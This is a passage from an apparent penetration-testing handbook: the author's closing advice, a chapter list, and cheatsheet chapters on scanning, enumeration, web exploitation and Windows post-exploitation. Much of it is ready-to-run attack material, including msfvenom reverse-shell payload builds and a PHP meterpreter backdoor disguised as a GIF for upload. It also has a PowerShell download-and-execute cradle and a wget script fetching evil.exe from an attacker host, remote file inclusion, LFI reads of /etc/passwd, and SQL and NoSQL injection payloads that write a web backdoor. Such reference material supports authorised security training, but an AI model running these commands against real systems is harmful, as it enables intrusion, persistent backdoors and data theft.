2. It pays off to take your mind off of the problem sometimes - don't neglect the people in life who care about you. It's easy to get obsessed with this field and get sucked into a rabbit hole of endless learning, but put it down sometimes and go crack a beer with the wife/husband/gf/bf/friend. Pet your cat sometimes.
3. **Network. Network. Network.** LinkedIn and Twitter are amazing to network with your industry. This may seem obvious but it took me a really long time to come out of my shell and start talking to people. However, this industry is more about the people you know than anything else. It's tight-knit and your geek network can land you in some really favorable situations. Get to know people, engage with them. **Take an interest in what they are doing \(it's probably pretty cool\)**. If you're an introvert take a few steps out of your shell, don't worry you can always run back in to recharge ;\)!
4. Bounce your ideas off people! - find people you can speak with on any given topic because there will be times when you have specific questions you won't be able to google for and even if you can it's more important to talk with someone who understands it at or above your level. That conversation starts a critical dialogue that will get your brain to take that step to the next level.
5. **Exploit development is hard. **Most of the people out there releasing really groundbreaking exploits are far smarter and have been doing this far longer than you or I. They are legends that make it possible for us to learn by sharing what they have researched/developed. With every new concept I learn I understand I am only scratching the surface and that it will take decades to get to that level; respect the time that has to be put into this and it will pay off, but don't be discouraged if it takes you a while to get anywhere. Our senses aren't able to natively perceive things in the context of programs running in memory, so it requires a perceptual switch \(and a difficult one at that\) to be able to really work out all the moving pieces of any exploit, and **that's okay**.
6. There is no feeling greater than basking in the glory of shell.
7. **In short, I've learned nothing. \(Except how to use bold\)**



# Summary

* [Introduction](README.md)
* [Chapter 1 - Cheatsheets](chapter-1.md)
* [Chapter 2 - Recon & Enumeration](chapter-2.md)
* [Chapter 3 - Exploiting Vulnerabilities](chapter-3.md)
* [Chapter 4 - Windows Post-Exploitation](chapter-4.md)
* [Chapter 5 - Linux Post-Exploitation](chapter-5.md)
* [Chapter 6 - Exploit Development](chapter-6.md)
* [Chapter 7 - Cracking](chapter-7.md)
* [Chapter 8 - Reverse Engineering](chapter-8.md)
* [Chapter 9 - Miscellaneous](chapter-9.md)

# Chapter 1 - Cheatsheets

> _If you wanna know how not secure you are, just take a look around. Nothing's secure. Nothing's safe. I don't hate technology, I don't hate hackers, because that's just what comes with it, without those hackers we wouldn't solve the problems we need to solve, especially security._
>
> _**— **_**Fred Durst**

It can take quite some time to remember all the nuances of commands and arguments for the various tools we must use. It's almost like learning a second language this is intended as a reference of what to use and how to use it

## NMAP

##### Network Scan

> ###### Arguments

-sn - ping scan (disable port scan, assumes all hosts up)
-sP - ping scan (skip host discovery, only shows hosts that respond) 
-sL - scan list



> ###### Examples

Kali> nmap -sn 192.168.1.0/24
Kali> nmap -sP 192.168.1.0/24
Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;done



##### Host Scan

> ###### Arguments

-p {1-65535} - ports
-6 - ipv6
-O - OS Detection
--osscan-limit - light os scan
--osscan-guess - aggressive os scan
-sV - version detection
--version-intensity {0-9} - light to aggressive
-sT - connect scan
-sU - UDP scan
-sS - stealth syn scan
-sN - tcp null scan
-A - OS detection + nmap scripts + traceroute + version
--script {script.nse} - load specific nmap script
--script-args={args} - pass arguments to script



> ###### Examples

Kali> nmap -p 1-65535 -sV -sS -T4 $TARGET
Kali> nmap -v -sS -A -T4 $TARGET
Kali> nmap -v -sV -O -sS -T4 $TARGET



##### Timing

> ###### Arguments

-n - never resolve dns
-R - always resolve dns
-T{0-5} - scan timing slow to fast
-F - fast scan
-r - scan ports consecutively
--version-intensity {0-9} - light to aggressive
--host-timeout {number}
--min-rate {number} --max-rate {number}
--max_retries {number}



##### Evasion

> ###### Arguments

-f [--mtu {number}] - fragment packets optionally with mtu
-D {decoy1,decoy2} - cloak with decoys
-S {ip} - spoof ip address
-g {port} - use given port number for scan
--proxies {url,url2} - use proxy through http/socks4
--data-length {number} - append random data to packets
--ip-options {options} - send packets with ip options
--ttl {number} - set ip ttl
--spoof-mac {mac} - spoof mac for scan
--bad-sum - send packets with bogus checksums



##### Output

> ###### Arguments

-v - verbose output
-oX - output xml
-oG - output greppable
--open - only show potentially open ports
--packet-trace - show all packets sent/recv
--append-output - noclobber



## MSFVenom

> ##### Arguments

-p - payload
--payload-options
    Display available payloads
LHOST=ADDRESS - Argument for IP Address
LPORT=PORT - Argument for port
-n [number] - NOPS
--platform {Windows|Linux} - Platform to build shellcode for
-a {x86|x64} - Architecture
-e {x86/shikata_ga_nai} - encoder
-b '{badchars}' - remove badchars from payload
-v [string] - name your variable
-f {python} - format for payload
--smallest - attempt to make payload as tiny as possible



> ##### Examples

Kali> msfvenom -p windows/meterpreter/reverse_tcp
                                lhost=192.168.1.232
                                lport=4444
                                --platform Windows
                                -a x86
                                -e x86/shikita_ga_nai
                                -b '\x00\x20\x25\x2b\x2f\x5c'
                                -v payload
                                -f python
                                --smallest



## BurpSuite

> ##### Setup

add to scope
only show scoped items



> ##### Intercept Traffic

Chain Burp Proxy such as:
127.0.0.1:80 -> $TARGET:80



> ##### Shortcuts

Send to repeater: Ctrl+R



## MSFConsole

> ##### Reverse TCP

msfconsole> use multi/handler
msfconsole> set payload windows/meterpreter/reverse_tcp
msfconsole> set lhost 10.10.10.1
msfconsole> set lport 4444
msfconsole> set exitonsession false
msfconsole> set enablestageencoding true



> ##### Jobs

msfconsole> jobs -K
msfconsole> jobs -L



## GDB

> ##### Commands

disas - disassemble
b - breakpoint
c - continue
r - run
p - TODO
st - step
x - examine



> ##### Examples

gdb> disas main
gdb> b 0xd34dc0d3
gdb> x/200x $esp



## WinDBG

> ##### Commands

g - pass exception
gN - step
bp [address] - breakpoint
bl - list breakpoints
!exchain - view exception chain
.load pykd.pyd - load python
!py mona [command] [args] - exceute mona stuff
a -> [jmp address]
u [address] - inspect
u - view stack
t - step



> ##### Examples

!py mona findmsp
!py mona seh



> ##### Shortcuts

Open Executable: CTRL+E
Attach to process: F6
Memory: Alt+5
Close Window: Ctrl+F4
Restart: Ctrl+Shift+F5
Break: Ctrl+Break



## ImmunityDebugger

> ##### Shortcuts

Breakpoint: F2
Step: F7
Exec till Return: Ctrl+F9
Run: F9
Pause: F12



## Mona

> ##### Arguments

pc [size] - generate cyclic pattern
po [address] - find offset
findmsp - find register overwritten with pattern
bytearray -b [badchars] - generate bytes from 0x00 to 0xff excluding badchars
jmp -r [register] - find a jump point
-n - skip modules that start with 0x00
-o - skip os modules
-m - module
-cm - module property
-cpd - filter bad chars



> ##### Examples

!mona config -set workingfolder path
!mona pc 2400
!mona po d34db33f
!mona findmsp
!mona find -s "\xff\xe4" -m comctl32.dll
!mona jmp -r esp
!mona seh -cm aslr=false
!mona seh -cpb "\x00\x0a\x0d"





# Chapter 2 - Recon & Enumeration

---

> _It is imperative that a scout should know the history, tradition, religion, social customs, and superstitions of whatever country or people he is called on to work in or among. This is almost as necessary as to know the physical character of the country, its climate and products. Certain people will do certain things almost without fail. Certain other things, perfectly feasible, they will not do. There is no danger of knowing too much of the mental habits of an enemy. One should neither underestimate the enemy nor credit him with superhuman powers. Fear and courage are latent in every human being, though roused into activity by very diverse means._
>
> _**— **_**Frederick Russell Burnham**

This is what I refer to as first-pass enumeration, or enumeration from the outside. We take the time to identify all running services and open ports and identify what they are, what they do and how we can communicate with them

## Information Gathering

##### Resources

[Recon-ng Tutorial](https://warroom.securestate.com/recon-ng-tutorial/)

##### Basic Information

Kali> whois domain.com
Kali> dig {a|txt|ns|mx} domain.com
Kali> dig {a|txt|ns|mx} domain.com @ns1.domain.com



##### Email

Kali> simplyemail.py -all -e domain.com



## Initial Discovery

##### Resources

[NMAP: A Practical Guide](https://www.exploit-db.com/papers/35425)

[NMAP: Scanning the Internet](https://www.youtube.com/watch?v=Hk-21p2m8YY)

[Massively Scaling your Scans](https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning)

##### Finger Printing

> ###### Banner Grabbing

Kali> nc -v $TARGET 80
Kali> telnet $TARGET 80
Kali> amap -bqv1 1-65535 $TARGET



> ###### TTL Fingerprinting

| Operating System | TTL |
| :--- | :--- |
| Windows | 128 |
| Solaris | 225 |
| Cisco | 225 |

##### Probing Neighbors

# IPV4/IPV6
Kali> netdiscover -i eth0

# IPV6
Kali> ping6 ff02::1%eth0



##### Network Scan

Kali> nmap -sn 192.168.1.0/24
Kali> nmap -sP 192.168.1.0/2
Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;done



##### UDP Scan

> ###### UDP-Protocol-Scanner

# Port Scan
udp-protocol-scanner.pl -f ips.txt

# Protocol specific scan
udp-protocol-scanner -p ntp -f ips.txt



> ###### Netcat

# UDP (ICMP Error -> Port Closed)
Kali> nc -nv -u -z -w 1 host 160-162



> ###### NMAP

Kali> sudo nmap -sU -A -T3 --top-ports 100 10.10.10.24



##### TCP Scan

> ###### Netcat

Kali> nc -nvv -w 1 -z host 1000-2000



> ###### NMAP

Kali> nmap -p 1-65535 -sV -sS -T4 $TARGET
Kali> nmap -v -sS -A -T4 $TARGET
Kali> nmap -v -sV -O -sS -T4 $TARGET



##### Masscan

[A Masscan Tutorial and Primer](https://danielmiessler.com/study/masscan/)

## Enumeration

##### HTTP

Stop what you're doing and go check the source code, yes all of it.

> ###### CMSHunter

[CMS-Hunter - GitHub](https://github.com/SecWiki/CMS-Hunter)

> ###### Directory Fuzzing

Kali> dirb http://$TARGET /usr/share/wordlists/dirb/big.txt -o dirb.txt
Kali> gobuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -t 100

# A little for loop so you can go do other stuff
Kali> for wordlist in $(ls);do gobuster -u http://$TARGET -w $wordlist -t 100;done

# dirsearch is fairly good
Kali> dirsearch -u http://$TARGET -e php



> ###### cURL

# Robots can give us a clue as to where to look next you may have to send a user agent
Kali> curl -s http://$TARGET/robots.txt

# Check all the methods
Kali> curl -vX OPTIONS $TARGET



> ###### Nikto

Kali> nikto -h http://$TARGET



> ###### BurpSuite

I don't care who you are or what you're doing but it's time to go poke the website with burp. Play with all the things, get params, post params, cookies, user agents, referrers in fact all the headers, change get requests to posts, take note of all error codes, fuzz parameter values, and names, etc.

> ###### SSL

Kali> ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $TARGET



##### DNS

> ###### Zone Transfer

Kali> host -l megacorpon.com ns1.megacorpone.com
Kali> dnsrecon -d domain.com -t axfr @ns1.domain.com
Kali> dnsenum domain.com
Kali> nslookup -> set type=any -> ls -d domain.com



> ###### Enumerate Subdomains

Kali> for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
Kali> dnsrecon -d $TARGET -D wordlist.txt -t std --xml output.xml



##### DATABASES

> **MSSQL**

Kali> nmap -sU --script=ms-sql-info $TARGET



##### LDAP

> **Resources**

[Understanding the LDAP](https://n0where.net/understanding-the-ldap/)

##### RPC

> **Examples**

Kali> Rpcinfo -p $TARGET



##### RDP

Kali> rdesktop -u admin -p password $TARGET



##### NETBIOS

> **Resources**

[NBTScan Cheatsheet](https://highon.coffee/blog/nbtscan-cheat-sheet/)

[TechNet NBTStat Reference](https://technet.microsoft.com/en-us/library/cc940106.aspx?f=255&MSPPError=-2147217396)

> **Examples**

# Sometimes shows logged in users/addresses
Kali> nbtscan $TARGET -R 54



##### SAMBA

> **Resources**

[Plundering Windows accounts through authenticated SMB sessions](https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions)

[Hacking windows shares through Samba with Linux](http://www.madirish.net/59)

> **Examples**

# Fingerprint version
Kali> smbclient -L //$TARGET

# TODO
Kali> nmblookup -A $TARGET

# null Session
Kali> rpcclient -v "" $TARGET
Kali> smbclient -L //$TARGET

# Minimal Scan
Kali> enum4linux $TARGET

# Scan Everything
Kali> enum4linux -a $TARGET

# discover windows/samba on subnet find macs and netbios name/domain
Kali> nbtscan 192.168.1.0/24

# Find open shares
Kali> nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
Kali> Showmount -e $TARGET/<port>

# Investigate share
Kali> smblookup -A $TARGET smbclient //MOUNT/share -I $TARGET -N

# Enumerate users
Kali> nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.0/24
Kali> python /usr/share/doc/python-impacket-doc/examples/samrdump.py $TARGET

# RID Cycling (500 = admin, 501 = Guest)
Kali> ridenum.py $TARGET 500 50000 /path/to/wordlist.txt

# NBTScan-Unixwiz
Kali> nbtscan-unixwiz -f $TARGET

# Mount Linux/Windows
Kali> mount $TARGET:/vol/share /mnt/nfs
Kali> Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””
C:\>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no



##### SMTP

VRFY username (verifies if username exists – enumeration of accounts)
EXPN username (verifies if username is valid – enumeration of accounts)



##### SNMP

> **Resources**

[What is SNMP?](https://technet.microsoft.com/en-us/library/cc776379%28v=ws.10%29.aspx)

[How to get IPv6 Address through SNMP](http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP)

[SNMPv3Enum](https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb)

[SNMP Enumeration](http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html)

> **Examples**

# Overview
Default Community Names:
public, private, cisco, manager

Enumerate MIB:
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports

# Enmerate users from SNMP
Kali> snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4
Kali> python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $TARGET

# Search SNMP with nmap
Kali> nmap -sT -p 161 192.168.1.0/24 -oG snmp_results.txt

# Examples
Kali> snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
Kali> onesixtyone -c community -I $TARGET
Kali> snmpcheck -t $TARGET
Kali> snmpenum -t $TARGET

# Version3
Kali> nmap -sV -p 161 --script=snmp-info 192.168.1.0/24

# Wordlists
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt





# Chapter 3 - Exploiting Vulnerabilities

> _That was the division in the hacking world: There were people who were exploring it and the people who were trying to make money from it. And, generally, you stayed away from anyone who was trying to make money from it._
>
> _**— **_**Jeff Moss**

## Finding Exploits

##### Search Exploit-DB

Kali> searchsploit windows 2003 | grep -i local



##### Search Google

Google> site:exploit-db.com exploit kernel <= 3

##### Search Metasploit

Kali> grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*



##### Search Vulners

[Vulners Audit](https://vulners.com/audit)

## Compiling Exploits

##### Compile for Windows

Kali> i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe



##### Compile for Architectures

Kali> gcc -m32 -o output32 hello.c (32 bit)
Kali> gcc -m64 -o output hello.c (64 bit)



## Breaking out of Virtualization

[Breaking into the Data Centre](https://www.youtube.com/watch?v=9ISRZJetUJw)

[VENOM Vulnerability](http://venom.crowdstrike.com)

## WebSockets

[Hacking with WebSockets HTML5](https://www.youtube.com/watch?v=bRn6ViFAomY)

## IPV6

[Penetration testing with IPv6](http://uninformed.org/?v=all&a=46&t=txt)

[How to pwn things with IPv6](https://blog.zsec.uk/ipv6-pwn/)

## HTTP

**Resources**

[OWASP AppSec Videos](https://www.owasp.org/index.php/Category:OWASP_Video)

[OWASP Testing Guide](https://www.owasp.org/images/1/19/OTGv4.pdf)

[Cracking the Lens: Attacking HTTPs hidden attack surface](https://www.youtube.com/watch?v=1Newz_wkMvs)

[How I hacked hundreds of companies through their helpdesk](https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c)

##### Headers

> ###### Send fake IP

Kali> curl --header "X-Forwarded-For: 192.168.1.1" http://$TARGET



##### XXE

> ###### Resources

[Exploitation: XML External Entity \(XXE\) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

[Exploiting a Real-World  XXE Vulnerability](https://www.youtube.com/watch?v=EZxGa6dqero)

[Exploiting XXE Vulnerabilities in file parsing](https://www.youtube.com/watch?v=LZUlw8hHp44)

##### XSS

> ###### Resources

[XSS Attack: Busting browsers to root](https://vimeo.com/26751019)

[DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

[DOM Flow - Untangling the DOM](https://www.youtube.com/watch?v=kedmtrIEW1k)

##### CORS

> **Resources**

[Exploiting Misconfigured CORS](http://c0d3g33k.blogspot.in/2017/10/exploiting-misconfigured-cors.html?m=1)

##### CSRF

> ###### Resources

[Computerphile: Cross Site Request Forgery](https://www.youtube.com/watch?v=vRBihr41JTo)

[Updating Anti-CSRF Tokens with BurpSuite](https://warroom.securestate.com/updating-anti-csrf-tokens-burp-suite/)

##### SSRF

> ###### Resources

[What is Server side Request Forgery?](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)

[A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

[Exploiting Server Side Request Forgery on a Node/Express Application \(hosted on Amazon EC2\)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

> ###### Example

Sometimes what appears to be RFI can lead to SSRF, here are some commands to help

# Port scan the internal resources available
Kali> wfuzz -c -z range,1-65535 --filter "l>2" http://$TARGET/proxy.php?path=localhost:FUZZ

# If you find one, dirbust it.
Kali> wfuzz -c -w /usr/share/wordlists/dirb/big.txt --filter "l>11" http://$TARGET:8080/FUZZ



##### RCE

> **Resources**

[Node.js Remote Code Execution as a Service](https://www.youtube.com/watch?v=Qvtfagwlfwg)

[Exploiting Python code execution in the web](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

[Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings)

[PHP Generic Gadget Chains](https://www.ambionics.io/blog/php-generic-gadget-chains)

[Utilizing Code Re-use or ROP in PHP Exploits](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)

[Pwning PHP Mail Function for fun and RCE](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

##### Server Side Template Injection

> **Resources**

[Server Side Template Injection](http://blog.portswigger.net/2015/08/server-side-template-injection.html)

[Server Side Template Injection: RCE for the Modern WebApp](https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf)

##### API

> **Resources**

[Cracking & Fixing REST APIs](http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs)

##### LFI

> ###### Resources

[Local File Inclusion Testing Techniques](https://www.exploit-db.com/docs/40992.pdf)

[Insecure PHP Functions & their Exploits \(LFI/RFI\)](https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)

[LFI and RFI -- The Website Security Vulnerability](https://www.hackersonlineclub.com/lfi-rfi/)

[Local File Inclusion to Remote Code Execution](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)

[Local File Inclusion to Remote Code Execution Advanced Exploitation PROC Shortcuts](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)

> ###### Examples

file:///etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
    send post data
expect://whoami



##### Open Redirects

> ###### Resources

[Open URL Redirects](https://zseano.com/tutorials/1.html)

##### RFI

Kali> echo "<?php phpinfo(); ?>" > evil.txt
http://$TARGET/index.php?path=http://$ATTACKER/evil.txt



##### Padding Oracle Attack

> ###### Resources

[Automated Padding Oracle Attacks with Padbuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

> ###### Arguments

url - first argument is the URL
encrypted - second argument is the encrypted text
bits - third argument is the number of bits per block
-cookies - define a cookie to use
-plaintext - plaintext to encrypt



> ###### Examples

Kali> padBuster.pl http://$TARGET "ENC-COOKIE-TEXT" 8
                                -cookies "ENC-COOKIE"
                                -plaintext '{"user":"admin","role":"admin"}'



##### AWS

> **Resources**

[AWS PENETRATION TESTING PART 1. S3 BUCKETS](https://www.virtuesecurity.com/blog/aws-penetration-testing-s3-buckets/)

##### File Upload

> ###### Make a backdoor GIF

# As a note, try to overwrite the magic bytes of your backdoor with a valid image
# so that the check will validate. This includes Content-Type.
Kali> msfvenom --list | grep php
Kali> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.237 LPORT=54321 -o evil.php
Kali> echo “FFD8FFEo” | xxd -r -p > evil.gif
Kali> cat evil.php >> evil.gif



> ###### Upload From CLI

Kali> curl -X POST
                -F "field1=test"
                -F "file=@/home/user/evil.gif"
                http://$TARGET/upload.php
                --cookie "cookie"



## E-Mail

**Resources**

[How to Bypass E-Mail gateways using common payloads](https://www.youtube.com/watch?v=eZxWDCetqkE)

## iSCSI

**Resources**

[An interesting route to domain admin via ISCSI](https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/)

## Databases

##### MySQL

> ###### Resources

[SQL Injection](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)

[SQLMap tricks for advanced SQL injeciton](https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/)

###### Examples

username'--
1'||'1'<'2
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1; #
AND 1 = 2 UNION SELECT 1,2,3,4,5
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
1 union all select 1,2,3,4,load_file("/etc/passwd"),6
1 union all select 1,2,3,4,"<?php ?>",6 into outfile '/var/www/html/backdoor.php'



##### MSSQL

> ###### Resources

[PenTest & Hack MSSQL](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

[SQL Injection Cheatsheet MSSQL](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)

##### MongoDB

> ###### Resources

[NoSQL Map](https://github.com/codingo/NoSQLMap)

> ###### Examples

true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);



## PBX

**Resources**

[Pentesting VOIP](https://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP)

[Introduction to Telephony and PBX](http://phrack.org/issues/49/5.html#article)

##### Examples

Kali> svmap $TARGET
Kali> svwar -m INVITE -eSTART-END $TARGET





# Chapter 4 - Windows Post-Exploitation

> _Practice the principle of least privilege. Do not log into a computer with administrator rights unless you must do so to perform specific tasks. Running your computer as an administrator \(or as a Power User in Windows\) leaves your computer vulnerable to security risks and exploits. Simply visiting an unfamiliar Internet site with these high-privilege accounts can cause extreme damage to your computer, such as reformatting your hard drive, deleting all your files, and creating a new user account with administrative access.” _
>
> _**— Indiana University \(Best practices for computer security\)**_

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[Windows Privilege Escalation Fundamentals - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/16.html)

[Windows PrivEsc Check - GitHub](https://github.com/pentestmonkey/windows-privesc-check)

[Windows Exploit Suggester - GitHub](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[Encyclopaedia Of Windows Privilege Escalation - YouTube](https://www.youtube.com/watch?v=kMG8IsCohHA)

[Level Up! Practical Windows Privilege Escalation - YouTube](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

[Windows Privilege Escalation methods for PenTesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[Windows Attacks At is the new Black - YouTube](https://www.youtube.com/watch?v=_8xJaaQlpBo)

[Well, that escalated quickly](https://toshellandback.com/2015/11/24/ms-priv-esc/)

[Analyizing local privilege escalations in win2k](http://uninformed.org/?v=all&a=45&t=txt)

[The System Challenge - Decoder's Blog](https://decoder.cloud/2017/02/21/the-system-challenge/)

[The Wallstreet of Windows Binaries](https://www.youtube.com/watch?v=8zlTv7fRjV8)

[Windows Operating System Archaeology](https://github.com/subTee/windows-operating-system-archaeology)

[Breaking .NET Through Serialization](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)

[Windows Kernel Exploits - GitHub](https://github.com/SecWiki/windows-kernel-exploits)

##### Cross Compiling from Kali

Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c



##### Transpile Python into EXE

Kali> python pyinstaller.py --onefile file.py



##### Uploading Files

Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt



##### Security Stuff

[Exploitation Techniques and Mitigations on Windows](http://www.hick.org/~mmiller/presentations/misc/exploitation_techniques_and_mitigations_on_windows.pdf)

[Windows Exploitation](https://exploit.courses/files/bfh2017/day6/0x60_WindowsExploiting.pdf)

[Authentication Registry Keys - MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737%28v=vs.85%29.aspx)

[Demystifying AppContainers in Windows 8 Part 1](https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/)

[Protected Processes in Windows](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2)

[LSA Authentication - MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326%28v=vs.85%29.aspx)

[Intercepting System Calls on x86\_64 Windows](http://jbremer.org/intercepting-system-calls-on-x86_64-windows/)

[Introduction to Windows Kernel Security](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html)

[Windows 8 ASLR Internals](http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html)

[Windows Program Automatic Startup Locations](https://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)

[Demystifying the Windows Firewall](https://channel9.msdn.com/Events/Ignite/New-Zealand-2016/M377)

[Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012 … and a new network attack](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[Bypassing Firewalls with Port 23](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[Pass the hash is dead long live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

[NetView](https://github.com/mubix/netview)

[Getting Windows to play with itself: A PenTester's guide to Windows API abuse](http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham)

##### AZURE

[Compromise as a Service: our pleAZURE](https://www.youtube.com/watch?v=gxWqwX7LfbU)

##### Powershell Foo

> **Resources**

[Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)

[PowerShell AD Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

[PowerShell Secrets and Tactics](https://www.youtube.com/watch?v=mPPv6_adTyg)

[An Intro to PowerShell and how to use it for Evil](https://www.youtube.com/watch?v=YSUJNInriiY)

[Offensive Active Directory with PowerShell](https://www.youtube.com/watch?v=cXWtu-qalSs)

[Low-Level Windows API Access From PowerShell - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/24.html)

[PowerShell Unicorn](https://github.com/trustedsec/unicorn)

[Sherlock for Powershell](https://github.com/rasta-mouse/Sherlock)

> ###### Upgrade Shell

C:\> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/file.txt')"



> ###### wget

echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1



> ###### Execute ps1

C:\> powershell -exec bypass -windowstyle hidden -nop -file c:\path\to\file.ps1



> ###### Stream contents of file

C:\> Get-Item /path/to/file.zip -Stream *



> ###### Get permissions of directory/file

C:\> Get-ACL C:\path\to\file\or\directory



> ###### Packet testing

# TCP
# Setup TCP Listener ie: netcat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.TcpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie")$client.Send($packet, $packet.Length);$client.Close();'

# UDP
# Setup UDP Listener ie: socat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.UdpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send($packet, $packet.Length);$client.Close();'

# ICMP
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET
